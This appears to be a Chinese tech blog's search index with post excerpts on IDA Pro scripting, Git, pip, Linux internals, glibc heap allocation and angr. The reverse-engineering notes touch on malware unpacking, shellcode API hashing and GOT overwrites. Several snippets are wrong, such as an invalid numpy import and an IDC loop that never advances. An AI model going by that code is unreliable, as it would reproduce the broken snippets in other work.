根据地址返回指向此处的交叉引用列表，Flow表示是否返回顺序执行代码引用地址。 CodeRefsFrom(long Address,bool Flow) 根据地址，返回由此出发的交叉引用列表，Flow表示是否返回顺序执行代码引用地址。 DataRefsTo(long Address) 根据目标地址，返回一个指向此处的数据引用列表 DataRefsFrom(long Address) 根据目标地址，返回一个由此出发的数据引用列表   HOOK   AddBpt(long Address) 根据地址下软件断点。 GetBptQty() 返回下断点个数 GetRegValue(string Register) 根据寄存器名称返回相应的值 SetRegValue(long Value, String Register) 设置相应寄存器的值。  ","categories": [],
        "tags": ["python","ida"],
        "url": "https://zjgcjy.github.io/posts/2018-01/python-code-for-hacker.html",
        "teaser":null},{
        "title": "Git Using",
        "excerpt":"     会用git已经好久，但是熟练程度并不是很好，而且许多用法并不清楚，这么好的分布式管理系统我怎么能不学呢，GitHub上空荡荡的我都不好意思了-_-    git初始化   在安装完成之后，需要最后一步进行设置，直接调用cmd。   git config --global user.name \"zjgcjy\" git config --global user.email \"zjgcjy@gmail.com\" git config --list     查看当前系统的用户信息（git信息）   git 创建版本库   版本库，又名仓库，英文名：repository，git可以用来追踪仓库的变化，简单来说又可以离线进行处理，所以又叫分布式版本控制。   创建一个空目录   mkdir learngit cd learngit pwd   把这个目录变成git可以管理的目录   git init Initialized empty Git repository in H:/learngit/.git/   此时的目录下会多一个.git目录，但是是隐藏的，.git是用来跟踪版本的，使用ls -ah可以看到该目录。 现在我们开始写一个readme.txt文件   vim readme.txt git is version control system. git is free software.   把文件加到仓库（缓冲）   git add readme.txt   如果没有任何显示，基本上表示成功。   把文件提交到仓库（提交）   git commit  -m \"wrote a readme.txt\"   git commit -m 后面跟的是本次提交的说明，git commit提交成功之后会有提示，一个文件被改动，新加入两条指令。 注意，git commit 一次可以提交许多内容，所以可以多次git add之后，把所有要提交的文件存入缓冲区，然后一次性全部提交。   git add file1.txt git add file2.txt  file3.txt git commit -m\"commit 3 files\"   时光机   之前已经成功提交了一个文件了，现在要看下版本的问题，什么是版本，如果进行版本的控制，于是，我们继续修改readme.txt文件。   再修改   Git is a distributed version control system. Git is free software.   然后 git status 查看结果。   $ git status On branch master Changes not staged for commit:   (use \"git add &lt;file&gt;...\" to update what will be committed)   (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory)          modified:   readme.txt  no changes added to commit (use \"git add\" and/or \"git commit -a\")   git diff命令   git status用来查看当前仓库的状态，分支是主线。但是结果还没有提交，git add用来添加，git commit -a用来提交， git checkout用来回滚到初始版本。对于不一样的版本，可以用git diff 命令。   $ git diff warning: LF will be replaced by CRLF in readme.txt. The file will have its original line endings in your working directory. diff --git a/readme.txt b/readme.txt index 1668572..4d53f0e 100644 --- a/readme.txt +++ b/readme.txt @@ -1,2 +1,2 @@ -git is a version control system. +git is a distributed version control system.  git is free software.   从上可以很明显的看到对readme.txt进行的操作，第一行加了分布式，其他都没有变。此时再添加提交就行了。   再次提交   $ git commit -m \"add distributed\" [master 009a23d] add distributed  1 file changed, 1 insertion(+), 1 deletion(-)   再次git status的时，git告诉我们当前没有需要提交的修改，而且，工作目录是干净。   版本回退与更新   使用git log命令查看历史提交记录，如果看到的信息太多，可以加参数。   git log --pretty=oneline  39a5195a73869cfe42cfab7fd9be768c185e69af (HEAD -&gt; master) appe    nd GPL  009a23d32fd41043cf8e86b842d3c8426aea74b9 add distributed  c8b834f0e0fd0967c9fa10793f427ddd392be0be wrote a readme file   回退   在Git中，必须知道当前的版本，HEAD表示当前的版本，HEAD^表示上一个版本，HEAD^^表示上上一个版本，HEAD~数字，表示以上的某一个版本。 把当前版本回退到上一个版本，可以使用 git reset命令   $ git reset --hard HEAD^ HEAD is now at 009a23d add distributed   Git版本在内部的更改只是采用更改头指针的方式，所以Git的版本回退速度特别快。   更新   使用git reflog 命令查看所有的提交记录   $ git reflog 009a23d (HEAD -&gt; master) HEAD@{0}: reset: moving to HEAD^ 39a5195 HEAD@{1}: commit: append GPL 009a23d (HEAD -&gt; master) HEAD@{2}: commit: add distributed c8b834f HEAD@{3}: commit (initial): wrote a readme file   可以看到每一条commit id的记录，可以再次使用 git reset –hard commit id（39a5195） 再次更新，回到append GPL版本。   工作区与暂存区   把文件添加到Git去的时候一共分两步。 第一步：用 git add 保存到暂存区。 第二步： 用 git commit 提交更改，就是把暂存区的内容提交到当前分支。当创建Git的时候。默认的分支是master，所以提交到master。git status 用来查看修改未被提交的文件，以及未被提交到分支的文件。   管理修改  ","categories": [],
        "tags": ["git"],
        "url": "https://zjgcjy.github.io/posts/2018-01/git-using.html",
        "teaser":null},{
        "title": "Python3 Using",
        "excerpt":"  coding :utf-8 file=open('/Users/Aegis/Desktop/file.txt','w') file.write('hello world !')   type()函数用来查看var类型   len()函数用来计算字符串长度   字符串分片：name[5:] 包括前端字符；name[:5]不包括后端字符。   replace(a,b) 函数，用b代替a。 string.find(……)=a.find(b)在a中寻找b。   print(‘{}……{}’.format(‘with’,’come’)) print(‘{x}……{y}’.format(x=’with’,y=’come’)) print(‘{0}……{1}’.format(‘with’),’come’)   内建函数   print() 输出函数 a=input()输入函数 int 转string : str(1015) ord() ：字符转10进制 chr() ：10进制转字符   def function(arg1,arg2):         return 'something'         print('hello world',sep=' ')    #sep以……分开 file.close()   // #地板除  for item in variable:         do something  if condition:         do something elif condition:         do something else:         do something  ##循环Loop  where condition:         do something  in  #成员运算符 is  #身份运算符 列表： album =['……','……',23,True]         album.append()  #添加元素         a=none, bool(0),bool([]),bool(''),bool(false),bool(none) #false        ","categories": [],
        "tags": ["python3"],
        "url": "https://zjgcjy.github.io/posts/2018-01/python3-using.html",
        "teaser":null},{
        "title": "Pip Using",
        "excerpt":"  pip install   这篇文章主要是讲的如何在win32/64构架下在python2.7/3.5安装pip第三方拓展包管理，进行有效的科学计算，机器学习，大数据处理，CTF（笑）。    安装pip   现在无论是python2.7/3.5以上都自带了pip包管理器，在cmd中直接输入pip，有效即可使用，不行的话github上手动安装:   git clone https://github.com/pypa/pip cd pip python get-pip.py   查看与更新   pip install -U pip   #更新pip pip install somepackage    #安装somepackage模块 pip install     #列出已经安装的模块 pip install --upgrade somepackage   #升级somepackage模块 pip uninstall somepackage     #卸载somepackage模块 pip install somepackage.whl   #使用whl文件安装somepackage模块   查看版本   在cmd中，输入python进入python（也可在IDE中进行）。   import pip print(pip.pep425tags.get_supported())   界面上输出当前python的版本信息,例如：   cp27', 'cp27m', 'win_amd64      python 2.7 win64 cp27', 'cp27m', 'win_win32        python 2.7 win32  (python2.7默认是32位) cp35', 'cp35m', 'win_amd64      python3.5 win64   之后对应于自己的系统和版本，到http://www.lfd.uci.edu/~gohlke/pythonlibs 网站下查找需要的第三方包。因为大多数第三方包都需要numpy作为基础，所以以下内容以numpy为例   安装Numpy   在安装之前还需要说明一下，该网址提供的都说whl文件，类似于zip压缩包，需要安装一个拓展。   pip install wheel   然后找到你下载的包就行了，例如，我的是python2.7+win64：numpy-1.13.0rc2+mkl-cp27-cp27m-win_amd64.whl 文件。打开cmd，输入pip install +whl文件的全名，安装whl。   pip install numpy-1.13.0rc2+mkl-cp27-cp27m-win_amd64.whl   按Enter后，等待安装完成。没什么问题的话就成功了。忘记截图了。   测试   import numpy from * random.rand(4,4)   若输出一个4*4的随机矩阵，则安装成功。   安装Scipy   方法和上面一样。安装效果如下。（可以看到，需要先安装numpy才行，不然会安装失败。）   pip install scipy-0.19.0-cp27-cp27m-win_amd64.whl Processing scipy-0.19.0-cp27-cp27m-win_amd64.whl Requirement already satisfied: numpy&gt;=1.8.2 in c:\\python27\\lib\\site-packages (from scipy==0.19.0) Installing collected packages: scipy Successfully installed scipy-0.19.0   安装pillow   pillow是用来图像处理用的，CTF比赛中也经常使用-_-。   pip install Pillow-4.1.1-cp27-cp27m-win_amd64.whl Processing pillow-4.1.1-cp27-cp27m-win_amd64.whl Collecting olefile (from Pillow==4.1.1)   Downloading olefile-0.44.zip (74kB)     100% |████████████████████████████████| 81kB 124kB/s Building wheels for collected packages: olefile   Running setup.py bdist_wheel for olefile ... done   Stored in directory: C:\\Users\\*****\\AppData\\Local\\pip\\Cache\\wheels\\cc7bd00345397059149a10b0259ef38b867935ea2ecff99a9b Successfully built olefile Installing collected packages: olefile, Pillow Successfully installed Pillow-4.1.1 olefile-0.44  ","categories": [],
        "tags": ["pip"],
        "url": "https://zjgcjy.github.io/posts/2018-01/pip-using.html",
        "teaser":null},{
        "title": "Linux知识补充",
        "excerpt":"     本篇是《深入理解计算机系统》的笔记。关于这本书前面的程序结构、硬件电路层我没怎么看，在计组里基本学过，没有深入研究。主要看了后面的Linux系统部分，顺带复习操作系统了。    链接——位置无关代码PIC   为了使多个进程可以共享一个共享模块的副本，GNU使用加载而无需重定位的代码，即GCC使用-fpic选项生成PIC代码。   PIC数据引用   无论我们在内存的何处加载目标模块，数据段和代码段之间的距离总是保持不变。因此，代码段中任何指令和数据段中的任何变量之间的距离都是一个常量，与代码段和数据段在内存中的绝对位置无关。 编译器在代码段在骑士部分创建GOT表，所有被引用的函数和变量都有一个条目，使得他包含目标的正确的绝对地址。 所以在进行PIC数据引用的时候，只要通过GOT就能加载全局变量的地址，而编译器可以通过相对引用来访问GOT，从而实现了对数据的相对访问。   PIC函数调用   为了使进程在运行时调用由共享库定义的函数，由于编译器没有办法预测函数的运行时地址，所以它的共享模块可以加载到任何地址，GNU编译器使用了延时绑定技术，将过程地址的绑定推迟到第一次调用的时候进行。使用两个表，一个GOT，一个是PLT。GOT是数据段的一部分，PLT是代码段的。 PLT是个数组，其中0索引是一个特殊条目，负责跳转到动态连接器中。和PLT一起使用时，GOT0索引和1索引包含动态连接器在解析函数地址所需要的地址。GOT2索引是动态链接器在ld-linux.so的入口点。其余的对于被调函数，不过地址需要在运行的时候再解析，每个GOT项对应一个PLT项。初始时，GOT的项指向对应PLT项的第二条指令(一般是push 偏移量)。   延时绑定      第一次调用，代码段通过call指令跳转到PLT表的某个表项。            执行PLT表项中第一条指令，根据GOT表项的数据进行间接跳转。而此时GOT表中存放的是对应的PLT项的下一条指令，所以又跳回了PLT表，相当于直接执行下一条指令。       执行PLT表项中第二条指令，进行push压入偏移量，偏移量表示函数对应在GOT表中的偏移。       执行PLT表项中第三条指令，跳转到PLT0索引处，将GOT1压栈，通过GOT2间接跳转到动态连接器中。动态链接器根据两个参数来决定函数的相对位置，并且重写GOT表项，同时执行函数。           第二次调用，同样是代码段通过call指令跳转到PLT表的某个表项。            执行PLT表项中第一条指令，根据GOT表项的数据进行间接跳转。但是和第一次不一样的是，此时的GOT表项中的数据是所执行函数的地址。所以直接执行函数。           进程   关于进程调度这部分就不说了。   进程控制   每个进程有唯一的进程ID，getpid函数可以返回调用进程的PID。getppid返回他的父进程的PID。   #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; //返回类型`pid_t`是int型的。 pid_t getpid(void); pid_t getppid(void);   进程的退出和创建   #include &lt;stdlib.h&gt; //进程退出。 void exit(int status);   子进程   父进程可以通过fork来创建子进程。   #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; //子进程返回0，父进程返回子进程的PID，错误返回-1。 pid_t fork(void);   子进程得到的虚拟地址控件和父进程是一样的，包括代码段和数据段，但是pid和父进程不同。通过fork函数的返回值可以判断当前是在父进程还是在子进程中。pid_t==0是子进程，但子进程的PID不为0。需要注意的是，父子进程是并发执行的，两个进程执行的速度不确定，但是父子进程是两个独立的进程，有自己的私有地址空间，变量保持独立。   进程休眠   #include &lt;unistd.h&gt; unsigned int sleep(unsigned int secs);      //设置休眠时间，返回还要休眠的时间  int pause(void);            //总是返回-1，收到型号后恢复。   进程加载   #include &lt;unistd.h&gt; int execve(const char *filename, const char **argv, const char **envp);   其中argv是参数列表，envp是环境变量列表。当main开始执行的时候，用户栈栈底往上依次是envp、argr、argc，然后是libc_start_main的栈帧，再往上是之后的main栈帧。 关于fork和execve函数的区别。fork是在新的子进程中运行相同的程序，是一个副本。而execve在当前进程上下文中加载并运行一个新的程序，会覆盖当前进程的地址空间，但是他不创建新的进程，pid是一样的。   进程组   #include &lt;unistd.h&gt; pid_t getpgrp(void);    //返回当初进程的组进程id  int setpgid(pid_t pid, pid_t  pgid);     //改变自己或其他进程的进程组   内存管理   堆和内存管理 地址转换  ","categories": [],
        "tags": ["linux"],
        "url": "https://zjgcjy.github.io/posts/2018-03/Linux%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85.html",
        "teaser":null},{
        "title": "Idapro权威代码破解揭秘笔记 1",
        "excerpt":"    本篇是关于《IDApro权威代码破解揭秘》的笔记,学习内容分为两部分，一是OS层面的系统知识，二是IDA脚本编写。    内存管理方式   以下的地址均是在Intel 32 位下。在64bit模式下分段直接被禁用了，内存完全平坦。   虚拟地址（逻辑地址）   即是16位里面的段+偏移量的地址表示方式，应用于寄存器寻址中。是80386 的默认内存寻址方式（保护模式）。 虚拟地址到线性地址转换：虚拟段地址结合GDT、LDT，得到段描述符基址，加上偏移量得到线性地址。这个过程被称为 段式内存管理 关于GDT和LDT   线性地址   应用于直接寄存器操作中的直接内存寻址方式，32bit长度的无符号整数地址即为线性地址。 如果启用了分页机制，那么线性地址可以再经过变换以产生一个物理地址 线性地址到物理地址转换：cr3中取出进程的页目录地址，根据线性地址前十位定位页表；根据线性地址的中间十位，在页表中找到页的起始地址，即页表项；根据线性地址中最后12位偏移量加上页的起始地址得到物理地址。这个过程被称为 页式内存管理   物理地址   地址线所代表的实际的内存地址，实模式下采用物理地址寻址。 注意：在linux下虚拟地址和线性地址数值相同，原因是所有的段基址都是0，段限长都是最大。而虚拟地址是在段内的偏移量，现在段就是整个线性空间，所以虚拟地址就是整个线性空间的偏移量，这和线性地址的概念一样   堆   关于堆的内存管理与分配，参考malloc()和free()的实现方式。   ptmalloc   GNU Libc 的内存分配器(allocator) — ptmalloc提供动态内存管理的支持。allocator一般都会预先分配一块大于用户请求的内存， 并通过某种算法管理这块内存。来满足用户的内存分配要求，用户 free 掉的内存也并不是立即就返回给操作系统，相反，allocator 会管理这些被 free 掉的空闲空间，以应对用户以后的内存分配要求。   主分配区和非主分配区   ptmalloc的内存分配器中，为了解决多线程锁争夺问题，分为主分配区main_area和非主分配区no_main_area。主分配区可以使用brk和mmap来分配，而非主分配区只能使用mmap来映射内存块。   chuck   ptmalloc 在给用户分配的空间的前后加上了一些控制信息，用这样的方法来记录分配的信息，以便完成分配和释放工作。 详细关于chunk结构的说明1 详细关于chunk结构的说明2   使用的chuck   chunk 指针指向一个 chunk 的开始。一个chunk 中包含了用户请求的内存区域和相关的控制信息。mem 指针才是真正返回给用户的内存指针。chunk 的第二个域的最低一位为p，它表示前一个块是否在使用中，p为0则表示前一个 chunk 为空闲，这时 chunk 的第一个域 prev_size 才有效，prev_size 表示前一个 chunk 的 size，程序可以使用这个值来找到前一个 chunk 的开始。当p为1时，表示前一个 chunk 正在使用中，prev_size 无效，程序也就不可以得到前一个 chunk 的大小。而不能对前一个 chunk 进行任何操作。 ptmalloc 分配的第一个块总是将p设为1，以防止程序引用到不存在的区域。   空闲的thunk   当 chunk 空闲时，原本是用户数据区的地方存储了两个指针，指针 fd 指向后一个空闲的 chunk，而 bk 指向前一个空闲的 chunk， ptmalloc 通过这两个指针将大小相近的 chunk 连成一个双向链表。而不同的 chunk 链表又是通过 bins 或者 fastbins 来组织的。   空闲链表bins   当用户使用free函数释放掉的内存，ptmalloc并不会马上交还给操作系统，而是被ptmalloc本身的空闲链表bins管理起来了，这样当下次进程需要malloc一块内存的时候，ptmalloc就会从空闲的bins上寻找一块合适大小的内存块分配给用户使用。 ptmalloc一共维护了128bin。每个bins都维护了大小相近的双向链表的chunk。   fast bins   fast bins是bins的高速缓冲区，大约有10个定长队列。当用户释放一块不大于max_fast（默认值64）的chunk（一般小内存）的时候，会默认会被放到fast bins上。当用户下次需要申请内存的时候首先会到fast bins上寻找是否有合适的chunk，然后才会到bins上空闲的chunk。   unsorted bin   是bins的一个缓冲区。当用户释放的内存大于max_fast或者fast bins合并后的chunk都会进入unsorted bin上。当用户malloc的时候，先会到unsorted bin上查找是否有合适的bin，如果没有合适的bin，ptmalloc会将unsorted bin上的chunk放入bins上，然后到bins上查找合适的空闲chunk。   exact bins（small bins）和ordered bins（large bins）   small bins和large bins是真正用来放置chunk双向链表的。每个bin之间相差8个字节，并且通过上面的这个列表，可以快速定位到合适大小的空闲chunk。前64个为small bins，定长；后64个为large bins，非定长。   top chunk   ptmalloc 会预先分配一块较大的空闲内存(也就是所为的 heap)，而通过管理这块内存来响应用户的需求，因为内存是按地址从低向高进行分配的，在空闲内存的最高处，必然存在着一块空闲 chunk。top chunk相当于分配区的顶部空闲内存，当bins上都不能满足内存分配要求的时候，就会来top chunk上分配。   mmaped chunk   当需要分配的 chunk 足够大，而且 fastbins 和 bins 都不能满足要求，甚至 top chunk 本身也不能满足分配需求时，ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间。当释放mmaped chunk上的内存的时候会直接交还给操作系统。      小内存： 获取分配区(arena)并加锁 -&gt; fast bin -&gt; unsorted bin -&gt; small bin -&gt; large bin -&gt; top chunk -&gt; 扩展堆   大内存： 直接mmap   sbrk &amp; mmap   ptmalloc 使用两种方法向内存索取内存空间：sbrk 和 mmap。   sbrk   .bss 段之上的这块分配给用户程序的空间被称为 heap (堆)。start_brk 指向 heap 的开始，而 brk 指向 heap 的顶部。可以使用系统调用 brk 和 sbrk 来增加标识 heap 顶部的 brk 值，从而线性的增加分配给用户的 heap 空间。 ptmalloc 在开始时，若请求的空间小于 DEFAULT_MMAP_THRESHOLD (128K bytes)时，ptmalloc 会调用sbrk增加一块大小为 ( 128 KB + chunk_size ) align 4K 的空间作为heap。这就是ptmalloc 所维护的分配空间，当用户请求内存分配时，首先会在这个区域内找一块合适的 chunk 给用户。当用户释放了 heap 中的 chunk 时，ptmalloc 又会使用 fastbins 和 bins 来组织空闲 chunk。以备用户的下一次分配。若需要分配的 chunk 大小小于 DEFAULT_MMAP_THRESHOLD，而 heap 空间又不够，则此时 ptmalloc 会通过 sbrk 调用来增加 heap 值，也就是增加 top chunk 的大小，每次 heap 增加的值都会 align 到4k bytes。   mmap   当用户的请求超过 DEFAULT_MMAP_THRESHOLD，并且使用 sbrk 分配失败的时候，ptmalloc 会尝试使用 mmap 直接映射一块内存到进程内存空间。使用 mmap 直接映射的 chunk 在释放时直接解除映射，而不再属于进程的内存空间。任何对该内存的访问都会产生段错误。而在 heap 中分配的空间则可能会留在进程内存空间内。   PE &amp; ELF 文件格式   关于PE格式，之前写过了。PE格式 关于ELF格式，这里不详细写了。主要是学习一下ELF的常见的节。   ELF常见区段   |区段名|说明| |:——–:|:—–:| |.text|可执行指令| |.bss|未初始化的全局变量或静态变量| |.data|已初始化的全局变量| |.rdata|只读数据| |.fini|结束应用程序的指令| |.init|开始应用程序的指令| |.got|GOT表，即全局偏移表| |.plt |PLT表，即过程链接表| |.dynamic|包含动态链接的信息| 这里其实没什么东西，主要是要懂plt表和got表之间的关系，已经如何实现覆盖got表来实现缓冲区溢出。 got表和plt表  ","categories": [],
        "tags": ["reverse","ida"],
        "url": "https://zjgcjy.github.io/posts/2018-03/IDApro%E6%9D%83%E5%A8%81%E4%BB%A3%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%8F%AD%E7%A7%98%E7%AC%94%E8%AE%B0-1.html",
        "teaser":null},{
        "title": "Idapro权威代码破解揭秘笔记 2",
        "excerpt":"     本篇是关于《IDApro权威代码破解揭秘》的笔记。主要是一些IDA的实战技巧。 这部分由于涉及到调试的部分，我就不截图了。写一些要点。    建立缓冲区   在IDA中，连续分配的局部变量，IDA默认都是一个一个分配的，这就导致如果是一个数组的话，识别起来会很困难，导致代码被曲解。方法是建立缓冲区。指定数组的首地址和大小，IDA便能自动进行优化，从而将很多零散的局部变量转换成基地址加偏移量的数组形式。   断点   关于断点的内容，之前也写过。 断点   hash寻找DLL   类似于一个windows的shellcode，例如对kernel32.dll的导出表进行遍历，同时对名字进行散列，与已知的散列值进行匹配，可以查找像LoadLibrary()、GetProcAddress()等函数的地址。详细说明可以GoogleSkape. Understanding Windows Shellcode   hit marking   关于bin的流程分析，最常用的分析方式是hit marking。即记录对每个消息的判断树的调用路径，在每次函数或块的开始设置断点。当断点被触发时，记下访问顺序，同时让程序继续运行到下一个块。最后把触发断点的列表进行排序得到hit list，通过list中的函数，我们可以拼凑出消息的结构。   编写hit marking 插件   主要就是掌握下IDApython脚本的编写，这部分以前也有学习过，不过没有系统学习，idapython的资料也比较少，可以GoogleThe Beginner’s Guide to IDAPython 关于内置的跟踪功能，使用idapython编写脚本进行自动化分析。下面给出书上的列题代码，但是我是试过之后，发现只设置了断点，而断点并没有启动，有点问题，而且每一个断点没有记录断点的经过次数，而这方面的资料比较少，目前我还不知道是怎么回事。   # coding:utf-8 __author__='zjgcjy'  from idaapi import *  def test(): \tfor i in xrange(get_func_qty()): \t\tf = getn_func(i) \t\tprint \"Function %s at 0x%x \" % (GetFunctionName(f.startEA), f.startEA) \t\tadd_bpt(f.startEA, 1, 4) \t\tSetBptAttr(f.startEA, BPTATTR_FLAGS, BPT_ENABLED | BPT_TRACE) # 这里必须设置BPT_ENABLED，否则没有作用。 \tprint \"[*] Set %d breakpoints.\" % GetBptQty() \t#for i in xrange(get_func_qty()): \t#\tb =bpt_t() \t#\tgetn_bpt(i, b) \t#\tb.flags ^=BPT_BRK \t#\tb.flags |=BPT_TRACE \t#\tupdate_bpt(b)  def main(): \ttest()  if __name__ == '__main__': \tmain()   主要的问题就是没有生成hit list，依然不知道函数或模块调用的次数，只有在断点列表中可以找到。在《IDApro权威指南》中也没有找到相应的说明。-_-   附上第二个脚本，使用hook进行实时调试。可以自动定义FuncPath类中的处理函数。   # coding:utf-8 __author__='zjgcjy'  from idaapi import * from idautils import * from idc import *  count = 0  # 从DBG_Hooks类继承 class FuncPath(DBG_Hooks):      # 断点处理函数     def dbg_bpt(self, tid, ea):     \tglobal count           count += 1         print \"[*] Hit: 0x%08x the %d time\" % (ea, count)           #         #         #         #         return 1  # 移除先前的调试 try:       if debugger:           print(\"Removing previous hook ...\")           debugger.unhook()   except:       pass  # 建立一个对象 debugger = FuncPath () # 将钩子装入IDA内建调试器 debugger.hook()  current_addr = ScreenEA()  # 遍历函数设置跟踪断点 for function in Functions(SegStart( current_addr ), SegEnd( current_addr )):     AddBpt( function )     SetBptAttr( function, BPTATTR_FLAGS, BPT_ENABLED|BPT_TRACE)  num_breakpoints = GetBptQty()  print \"[*] Set %d breakpoints.\" % num_breakpoints  ","categories": [],
        "tags": ["reverse","ida"],
        "url": "https://zjgcjy.github.io/posts/2018-03/IDApro%E6%9D%83%E5%A8%81%E4%BB%A3%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%8F%AD%E7%A7%98%E7%AC%94%E8%AE%B0-2.html",
        "teaser":null},{
        "title": "Idapro权威代码破解揭秘笔记 3",
        "excerpt":"     本篇是关于《IDApro权威代码破解揭秘》的笔记。这一部分主要是逆向分析恶意代码和IDC脚本的编写与应用。    实例分析   例子是一个广告程序，MFC写的，UPX加壳。先脱壳，这里我不用OD，直接用IDA插件自动脱壳了。之后要根据编译器手动加载签名库，首选的是MS Visual C++ runtime，再尝试MFC的签名库，但是我试过了还是有函数不能识别出来，可能是版本的问题，我也没有全部都试。接下来就是调试了，比较烦，这里就不记了，主要的流程就是从AfxWinMain开始寻找交叉引用，然后逐步分析，包括线程之间的通信，识别mutex变量，CDialog的构造函数，以及网络通信部分，包括网址的访问和下载文件的方式。具体就不写了(￣_,￣ )   IDC 脚本   上次写了idapython的，这次是IDC，IDC是IDA的内置脚本，语法类似C，但是是脚本语言，不需要编译。   变量   IDC中所有变量都是auto类型。      整数是32位，在IDA64中是64位   字符串最多包含1023个字符   浮点变量可以最逗有25个十进制位   变量的声明和赋值必须在不同的语句中进行 特殊常量：BADADDR   条件   可以使用if、if else、? :等语句，但是没有switch语句。   函数   IDC中的所有函数均是静态函数，例如：   static outputCurrentAddress(myString) {     auto currAddress;     currAddress = ScreenEA();     Message(\"%x %s \\n\", currAddress, myString);     return currAddress; }   全局变量   IDC不支持直接定义全局变量。不过可以通过数组来模拟全局变量。下面讲一下IDC里面全局变量的id用法，以及获取id来进行操作。 首先创建一个全局的数组变量。   long CreateArray(string str); e.g: auto gArray; gArray = CreateArray(\"myGlobals\");   注意的是，CreateArray()返回的是数组的id值，如果创建失败则返回-1。即gArray中保存了数组的id值，然后对该数组进行变量添加。   success SetArrayLong(long id, long idx, long value);    //根据某个数组id来设置索引为idx处的值 success SetArrayString(long id, long idx, string str);  //根据某个数组id来设置索引为idx处的值 e.g: SetArrayLong(gArray, 23, 415);  //将415插入到gArray数组的23索引处 SetArrayString(gArray, 0, \"some string name\");  //将\"some string name\"插入到gArray数组的0索引处   数组创建完成后，即可通过API进行访问。为了访问数组的成员，需要其id确定是哪个数组，然后通过索引来获取成员数据。   long GetArrayId(string name);       //根据数组名获取数组id string or long GetArrayElement(long tag, long id, long idx)     //通过tag标志和数组id以及下标来获取数组元素 e.g: auto arrayid, strItem, longItem; arrayid = GetArrayId(\"myGlobals\"); strItem = GetArrayElement(AR_STR, arrayid, 0); longItem = GetArrayElement(AR_LONG, arrayid, 23);   下面我们使用common.idc来完成基本的IDC框架。   #define GLOBAL_VARS \"GLOBALS\"  #define GetGlobalVarLong(gvar)        GetArrayElement(AR_LONG, GetArrayId(GLOBAL_VARS), gvar) #define SetGlobalVarLong(gvar, val)   SetArrayLong(GetArrayId(GLOBAL_VARS), gvar, val)  #define GetGlobalVarString(gvar)      GetArrayElement(AR_STR, GetArrayId(GLOBAL_VARS), gvar) #define SetGlobalVarString(gvar, val) SetArrayString(GetArrayId(GLOBAL_VARS), gvar, val)   下次使用的时候就很简单了，经过宏定义了。   IDC脚本框架   #include &lt;idc.idc&gt; static function() {  } static main() {  }   其中idc.idc定义了IDC函数中的基本原型和常量。   补：这里贴上一个做题用到的代码，应对程序自修改等情况。   #include &lt;idc.idc&gt; static main() {     auto a = 0x0020004b;     auto i;     for (i=0; i&lt;0x2a5;)     {         PatchDword(a+i,Dword(a+i)^0x3f5479f1);         //Message(\"%#x %#x\\n\",a+i,Dword(a+i));         i=i+4;     } }   C++逆向   关于C++逆向，主要是分析虚表吧，这部分目前我还不是很懂，之后再学习了。相关链接   C++逆向1 C++逆向2   有用的IDC函数   关于数据读写的函数如下。   long Byte(long ea);     //获取某个地址的字节 long Word(long ea);     //获取某个地址的字 long Dword(long ea);    //获取某个地址的双字  void PatchByte(long ea, long value);        //修改某个地址的字节 void PatchWord(long ea, long value);        //修改某个地址的字 void PatchDword(long ea, long value);       //修改某个地址的双字   关于注释和代码遍历的函数如下。   success MakeComm(long ea, string comment); success MakeRptCmt(long ea, string comment); ……还有好多。  long NextAddr(long ea); long NextFunction(long ea); long NextHead(long ea, long maxea); long NextSeg(long ea);  long PrevAddr(long ea); long PrevFunction(long ea); long PrevHead(long ea, long minea);  # 迭代输出本段中的所有函数 auto currAddr, func, endSeg, funcName, counter; currAddr = ScreenEA(); func = SegStart(currAddr); endSeg = SegEnd(currAddr);  counter = 0; while (func != BADADDR &amp;&amp; func &lt; endSeg) {     funcName = GetFunctionName(func);     if (funcName != \" \") {         Message(\"%x: %s\\n\", func, funcName);         counter++;     }     funcName = NextFunction(func); } Message(\"%d functions in segment: %s\\n\", counter, SegName(currAddr));   关于其他的交叉引用的函数、数据表示的函数、输入输出的函数，比较冗杂，需要用的时候查就行了。   关于IDA插件编写   这部分暂时用不到，而且IDA7.0更新了SDK，导致之前版本的插件都要重写，没有学习的必要，先掌握IDC和idapython就好了。  ","categories": [],
        "tags": ["reverse","ida"],
        "url": "https://zjgcjy.github.io/posts/2018-03/IDApro%E6%9D%83%E5%A8%81%E4%BB%A3%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%8F%AD%E7%A7%98%E7%AC%94%E8%AE%B0-3.html",
        "teaser":null},{
        "title": "Angrdocpart 1",
        "excerpt":"     angr 文档自理解式翻译 从angr第二章核心概念开始，第一节 顶层接口    顶层接口   在开始学习angr之前，你需要对angr的概念和怎样去构建一些基础的angr对象有一个整体的把握。我们会通过测试当前在你加载执行文件后获得了什么来复习这些知识。（什么鬼-_-） 你的第一个步使用angr总是加载一个文件来生成一个工程。   import angr proj = angr.Project('./su_pwn100')   工程是你控制angr的基础，有了它，你就能进行分析和模拟刚刚加载的文件。几乎在angr中碰到的所有单个对象在某种形式上都取决于工程的存在。   基础性能   首先，我们的工程有一些基础的性能：CPU架构，文件名，入口点等等。   In [5]: import monkeyhex    # 格式化16进制输出  In [6]: proj.arch Out[6]: &lt;Arch X86 (LE)&gt;  In [7]: proj.entry Out[7]: 0x8048560  In [8]: proj.filename    Out[8]: './su_pwn100'  # proj属性 proj.analyses             proj.hook_symbol_batch    proj.storage proj.arch                 proj.hooked_by            proj.store_function proj.entry                proj.is_hooked            proj.surveyors proj.execute              proj.is_symbol_hooked     proj.terminate_execution proj.factory              proj.kb                   proj.unhook proj.filename             proj.load_function        proj.unhook_symbol proj.hook                 proj.loader                proj.hook_symbol          proj.simos   可以看到，proj的属性有很多，其中比较常用的是：arch、analyses、loader、entry、factory、filename、hook等。 arch是archinfo.Arch的实例对象，显示了文件的架构，这个例子是x86架构小段架构（LE）。它还包含了很多CPU运行的数据，比如arch.bits代表的是机器的数据长度，arch.bytes（不清楚是什么含义）。 entry是执行文件的入口点，filename是文件名。   加载器   从一个二进制文件中到运行时的虚拟地址空间是非常复杂的。我们有一个模块叫做CLE。CLE的结果，叫做加载器，可以在.loader属性中获得。我们之后再详细讨论这个问题，但是现在我们只需要知道，我们可以通过它来观察共享库的加载情况和对加载地址空间进行基本的数据查询。   In [21]: proj.loader Out[21]: 